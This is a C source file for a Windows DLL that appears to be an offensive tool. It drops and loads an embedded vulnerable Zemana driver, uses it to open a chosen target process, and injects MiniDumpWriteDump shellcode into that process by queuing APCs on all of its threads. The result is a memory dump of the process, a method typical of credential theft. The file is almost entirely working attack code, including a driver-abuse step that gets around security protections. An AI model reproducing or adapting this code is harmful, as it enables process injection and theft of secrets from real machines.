#define _WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <wchar.h>
#include <stdio.h>
#include "fsutil.h"
#include "service.h"
#include "zemana.h"
#include "bomb.h"
#if defined(_WIN64) || defined(_M_X64)
#include "zam.x64.h"
#include "payload.x64.h"
#else
#include "zam.x86.h"
#include "payload.x86.h"
#endif

VOID Entrypoint( _In_ DWORD ProcessId ) {
	PCHAR  szFileName = GetTemporaryFile(5, ".sys");
	PCHAR  szMiniDump = GetTemporaryFile(5, ".dmp");
	HANDLE hDriver    = NULL;
	HANDLE hProcess   = NULL;
	HANDLE hThread    = NULL;

	printf("[ ] driver will be stored in %s\n", szFileName);
	printf("[ ] minidump will be stored in %s\n", szMiniDump);
	if ( DumpBufferToFile(szFileName, sz_zam, sizeof(sz_zam) - 1) ) {
		printf("[ ] attemping to load %s with service control manager\n", szFileName);
		if ( LoadDriver( szFileName ) == TRUE ) {
			printf("[+] LoadDriver() successfully loaded the driver\n");

			hDriver = ZemanaOpenHandle();
			if ( hDriver != INVALID_HANDLE_VALUE ) {
				printf("[ ] Calling ZemanaRegisterProcess() to add %lu\n", GetCurrentProcessId());
				if ( ZemanaRegisterProcess( hDriver, GetCurrentProcessId() ) == TRUE ) {
					printf("[ ] Opening target process -> %lu\n", ProcessId);
					if ( ZemanaOpenProcess( hDriver, ProcessId, & hProcess ) ) {
						printf("\n ======= ENTER THE DANGER ZONE =======\n");

						LPVOID    ShellcodeBuffer = NULL;
						LPVOID    ArgumentBuffer  = NULL;
						ULONG_PTR SizeOfShellcode = 0;
						SIZE_T    BytesWrote      = 0;

						SizeOfShellcode = sizeof(sz_shellcode);
						ShellcodeBuffer = VirtualAllocEx(hProcess, NULL, SizeOfShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						ArgumentBuffer  = VirtualAllocEx(hProcess, NULL, strlen(szMiniDump), MEM_COMMIT, PAGE_READWRITE);
						WriteProcessMemory( hProcess, ShellcodeBuffer, sz_shellcode, SizeOfShellcode, &BytesWrote );
						WriteProcessMemory( hProcess, ArgumentBuffer , szMiniDump, strlen(szMiniDump) + 1, &BytesWrote );
						printf("[ ] MiniDumpWriteDump Shellcode is %i bytes\n", SizeOfShellcode);
						printf("[ ] Attemping to APC Bomb All Threads\n");
						ThreadBombApc( hDriver, ProcessId, ShellcodeBuffer, ArgumentBuffer );

						printf(" ======= LEAVE THE DANGER ZONE =======\n\n");
						CloseHandle( hProcess );
						CloseHandle( hDriver  );
					};
				};
				CloseHandle(ZemanaOpenHandle);
			};
		};
		UnloadDriver( szFileName );
	} else { printf("[!] Entrypoint: GetLastError() -> 0x%x\n", GetLastError()); };

	if ( DeleteFileA(szFileName) != TRUE )
		printf("[!] failed to delete %s: GetLastError() -> 0x%x\n",
			szFileName, GetLastError());
};

BOOL DllMain( _In_ HINSTANCE hModule,
              _In_ ULONG32 ulAttachReason,
              _In_ LPVOID lpParameter )
{
	DWORD InputProcessNumber = *(DWORD *)lpParameter;

	switch (ulAttachReason) {
		case DLL_PROCESS_ATTACH:
			if ( InputProcessNumber == 0 ) {
				printf("[!] please provide a valid process id\n");
				break;
			};
			Entrypoint(InputProcessNumber);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
			break;
	};
	fflush( stdout );
	ExitProcess ( ERROR_SUCCESS );
	return TRUE;
};
